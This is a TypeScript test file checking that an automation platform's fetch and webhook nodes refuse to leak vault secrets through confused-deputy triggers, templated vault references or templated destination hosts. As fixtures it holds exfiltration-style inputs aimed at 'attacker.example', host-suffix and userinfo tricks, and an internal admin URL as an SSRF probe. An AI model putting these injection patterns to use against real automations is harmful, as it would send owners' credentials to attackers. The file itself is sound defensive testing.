import { describe, it, expect, beforeEach, vi } from "vitest";

/**
 * The automation `fetch` and `webhook` nodes send the OWNER's vault secrets to
 * a URL. Pre-launch audit 2026-10-28, governance F3:
 *   - `fetch` had no confused-deputy guard: an agent-produced trigger of a
 *     human-owned automation sent the owner's credentials to a URL the agent
 *     chose (the `webhook` node refused exactly this);
 *   - both resolved `vault://` AFTER template substitution: a header such as
 *     `X-Token: {{trigger.payload.token}}` turned a sender's `vault://<id>`
 *     into the owner's plaintext secret.
 * Real: the template resolver, `validateExternalUrl`, the producer guard and
 * the authored-only vault rule. Mocked: the governance ladder, the vault
 * lookup (a recorder that answers PLAINTEXT) and the network (a recorder).
 */

const SECRET_REF = "vault://11111111-2222-4333-8444-555555555555";

const h = vi.hoisted(() => ({
  resolveDecision: vi.fn(async (input: { agentUserId: string }) =>
    input.agentUserId === "producer-agent"
      ? { decision: "propose" as const, reason: "forced review" }
      : { decision: "not-agent" as const }
  ),
  resolveVault: vi.fn(async (refs: Record<string, string>) =>
    Object.fromEntries(Object.keys(refs).map((k) => [k, "PLAINTEXT-SECRET"]))
  ),
  fetch: vi.fn(
    async () =>
      new Response(JSON.stringify({ ok: true }), {
        status: 200,
        headers: { "content-type": "application/json" },
      })
  ),
}));

vi.mock("@synap/database", () => ({
  db: { select: vi.fn(), update: vi.fn(), insert: vi.fn() },
  eq: vi.fn(),
  and: vi.fn(),
  or: vi.fn(),
  isNull: vi.fn(),
  desc: vi.fn(),
  automations: {},
  entities: {},
  users: {},
  channels: {},
  notifications: {},
  focusSessions: {},
  playbookEnrollments: {},
  relations: {},
  drizzleSql: vi.fn(),
  EntityRepository: class {},
  EntityBodyService: class {},
  materializeEntity: vi.fn(),
  eventRepository: {},
  insertChannelMessage: vi.fn(),
  ChannelRepository: class {},
  proposals: {},
  ProposalStatus: { PENDING: "pending" },
  insertPendingProposal: vi.fn(),
  automationStepRuns: {},
  verifyPermission: vi.fn(),
}));
vi.mock("@synap/database/agent-governance", () => ({
  resolveAgentGovernanceDecision: h.resolveDecision,
}));
vi.mock("@synap/events", () => ({ emitSideEffects: vi.fn() }));
vi.mock("../../../utils/vault-resolver.js", () => ({
  isVaultReference: (v: string) => /^vault:\/\/[0-9a-f-]{36}(?:\/.+)?$/.test(v),
  resolveVaultReferences: h.resolveVault,
}));
vi.mock("@synap/shared-utils", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@synap/shared-utils")>()),
  safePublicFetch: h.fetch,
}));
vi.mock("../../capability-dispatch.js", () => ({
  dispatchOutputVerb: vi.fn(async () => ({ status: "ok" })),
}));
vi.mock("../../automation-executor-logger.js", () => ({
  logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));
vi.mock("@synap/governance-policy", () => ({
  requiredPermissionFor: vi.fn(() => "write"),
}));

import { executeFetchStep } from "../fetch.js";
import { executeOutputStep } from "../output.js";
import type {
  StepContext,
  ExecutionPayload,
} from "../../automation-executor-types.js";

const context = (payload: Record<string, unknown> = {}) =>
  ({
    trigger: { payload },
    steps: {},
    automation: { id: "auto-1", state: {} },
  }) as unknown as StepContext;

const fetchNode = (
  headers: Record<string, string>,
  url = "https://api.vendor.com/v1/x"
) => ({ method: "POST", url, headers, body: "" });

const runFetch = (
  data: ReturnType<typeof fetchNode>,
  payload: Record<string, unknown> = {},
  producerAgentUserId?: string
) =>
  executeFetchStep(data, context(payload), "human-owner", {
    workspaceId: "ws-1",
    producerAgentUserId,
  });

const sentHeaders = () =>
  (
    h.fetch.mock.calls[0] as unknown as [
      string,
      { headers: Record<string, string> },
    ]
  )[1].headers;

beforeEach(() => {
  h.resolveDecision.mockClear();
  h.resolveVault.mockClear();
  h.fetch.mockClear();
});

describe("fetch node: the producer guard (governance F3)", () => {
  it("agent producer + human owner: refused before any request or secret", async () => {
    await expect(
      runFetch(fetchNode({ Authorization: SECRET_REF }), {}, "producer-agent")
    ).rejects.toThrow(/confused-deputy guard/);
    expect(h.fetch).not.toHaveBeenCalled();
    expect(h.resolveVault).not.toHaveBeenCalled();
  });

  it("no producer: proceeds without consulting the ladder", async () => {
    await runFetch(fetchNode({}));
    expect(h.fetch).toHaveBeenCalledTimes(1);
    expect(h.resolveDecision).not.toHaveBeenCalled();
  });
});

describe("fetch node: vault references only where the author wrote them", () => {
  it("an authored vault:// header is resolved and sent", async () => {
    await runFetch(fetchNode({ Authorization: SECRET_REF, "X-A": "1" }));
    expect(h.resolveVault).toHaveBeenCalledWith(
      { Authorization: SECRET_REF },
      "human-owner"
    );
    expect(sentHeaders()).toMatchObject({
      Authorization: "PLAINTEXT-SECRET",
      "X-A": "1",
    });
  });

  it("a vault:// that came out of a template is refused, never resolved, never sent", async () => {
    await expect(
      runFetch(fetchNode({ "X-Token": "{{trigger.payload.token}}" }), {
        token: SECRET_REF,
      })
    ).rejects.toThrow(/became a vault:\/\/ reference through a template/);
    expect(h.resolveVault).not.toHaveBeenCalled();
    expect(h.fetch).not.toHaveBeenCalled();
  });

  it("a refused URL is refused BEFORE any secret is resolved", async () => {
    await expect(
      runFetch(
        fetchNode(
          { Authorization: SECRET_REF },
          "http://kratos.:4434/admin/identities"
        )
      )
    ).rejects.toThrow(/fetch node blocked/);
    expect(h.resolveVault).not.toHaveBeenCalled();
    expect(h.fetch).not.toHaveBeenCalled();
  });
});

describe("webhook node: vault references only where the author wrote them", () => {
  const autoCtx = {
    automationId: "auto-1",
    automationRunId: "run-1",
  } as unknown as ExecutionPayload["automationContext"];
  const runWebhook = (
    headers: Record<string, string>,
    payload: Record<string, unknown> = {}
  ) =>
    executeOutputStep(
      {
        outputType: "webhook",
        config: { url: "https://hooks.vendor.com/in", headers, body: {} },
      },
      context(payload),
      "ws-1",
      autoCtx,
      "human-owner",
      "human-owner",
      { nodeId: "n-1", stepRunId: "sr-1" },
      null,
      undefined
    );

  it("an authored vault:// header is resolved", async () => {
    await runWebhook({ Authorization: SECRET_REF });
    expect(h.resolveVault).toHaveBeenCalledTimes(1);
    expect(sentHeaders()).toMatchObject({ Authorization: "PLAINTEXT-SECRET" });
  });

  it("a templated header that becomes vault:// is refused, never resolved", async () => {
    await expect(
      runWebhook(
        { "X-Token": "{{trigger.payload.token}}" },
        { token: SECRET_REF }
      )
    ).rejects.toThrow(/became a vault:\/\/ reference through a template/);
    expect(h.resolveVault).not.toHaveBeenCalled();
    expect(h.fetch).not.toHaveBeenCalled();
  });
});

/**
 * Finding f14cdea7: an AUTHORED vault secret sent to a TEMPLATED destination.
 * `Authorization: vault://<id>` is written in the node, so rule 1 above passes
 * it; the URL's host came from the run, so the owner's secret went to the
 * run's host. A secret now goes only to the origin written in the node.
 */
describe("vault secrets go only to the origin written in the node (f14cdea7)", () => {
  it("fetch: a templated host with an authored vault header is refused before the vault is read", async () => {
    await expect(
      runFetch(
        fetchNode(
          { Authorization: SECRET_REF },
          "https://{{trigger.payload.host}}/v1/x"
        ),
        { host: "attacker.example" }
      )
    ).rejects.toThrow(/only sent to the URL as written/);
    expect(h.resolveVault).not.toHaveBeenCalled();
    expect(h.fetch).not.toHaveBeenCalled();
  });

  it("fetch: a whole-URL template is refused", async () => {
    await expect(
      runFetch(
        fetchNode({ Authorization: SECRET_REF }, "{{trigger.payload.url}}"),
        {
          url: "https://attacker.example/collect",
        }
      )
    ).rejects.toThrow(/no fixed origin/);
    expect(h.resolveVault).not.toHaveBeenCalled();
    expect(h.fetch).not.toHaveBeenCalled();
  });

  it("fetch: a host suffix from a template is refused (api.vendor.com{{s}} -> api.vendor.com.attacker.example)", async () => {
    await expect(
      runFetch(
        fetchNode(
          { Authorization: SECRET_REF },
          "https://api.vendor.com{{trigger.payload.s}}/v1/x"
        ),
        { s: ".attacker.example" }
      )
    ).rejects.toThrow(/only sent to the URL as written/);
    expect(h.resolveVault).not.toHaveBeenCalled();
    expect(h.fetch).not.toHaveBeenCalled();
  });

  it("fetch: a templated port, or a userinfo template that moves the host, is refused", async () => {
    for (const url of [
      "https://api.vendor.com:{{trigger.payload.p}}/v1/x",
      "https://{{trigger.payload.u}}@api.vendor.com/v1/x",
    ]) {
      await expect(
        runFetch(fetchNode({ Authorization: SECRET_REF }, url), {
          p: "8443",
          // resolves to https://attacker.example/@api.vendor.com/v1/x
          u: "attacker.example/",
        })
      ).rejects.toThrow(/only sent to the URL as written|no fixed origin/);
    }
    expect(h.resolveVault).not.toHaveBeenCalled();
    expect(h.fetch).not.toHaveBeenCalled();
  });

  it("fetch: a literal origin with a templated path and query still sends the secret there", async () => {
    await runFetch(
      fetchNode(
        { Authorization: SECRET_REF },
        "https://api.vendor.com/v1/{{trigger.payload.id}}?q={{trigger.payload.q}}"
      ),
      { id: "42", q: "a" }
    );
    expect(h.resolveVault).toHaveBeenCalledTimes(1);
    expect((h.fetch.mock.calls[0] as unknown as [string])[0]).toBe(
      "https://api.vendor.com/v1/42?q=a"
    );
    expect(sentHeaders()).toMatchObject({ Authorization: "PLAINTEXT-SECRET" });
  });

  it("fetch: a templated host WITHOUT a vault secret is not this rule's business", async () => {
    await runFetch(
      fetchNode({ "X-A": "1" }, "https://{{trigger.payload.host}}/x"),
      {
        host: "api.vendor.com",
      }
    );
    expect(h.fetch).toHaveBeenCalledTimes(1);
    expect(h.resolveVault).not.toHaveBeenCalled();
  });

  it("webhook: a templated host with an authored vault header is refused before the vault is read", async () => {
    await expect(
      executeOutputStep(
        {
          outputType: "webhook",
          config: {
            url: "https://{{trigger.payload.host}}/in",
            headers: { Authorization: SECRET_REF },
            body: {},
          },
        },
        context({ host: "attacker.example" }),
        "ws-1",
        {
          automationId: "auto-1",
          automationRunId: "run-1",
        } as unknown as ExecutionPayload["automationContext"],
        "human-owner",
        "human-owner",
        { nodeId: "n-1", stepRunId: "sr-1" },
        null,
        undefined
      )
    ).rejects.toThrow(/only sent to the URL as written/);
    expect(h.resolveVault).not.toHaveBeenCalled();
    expect(h.fetch).not.toHaveBeenCalled();
  });
});
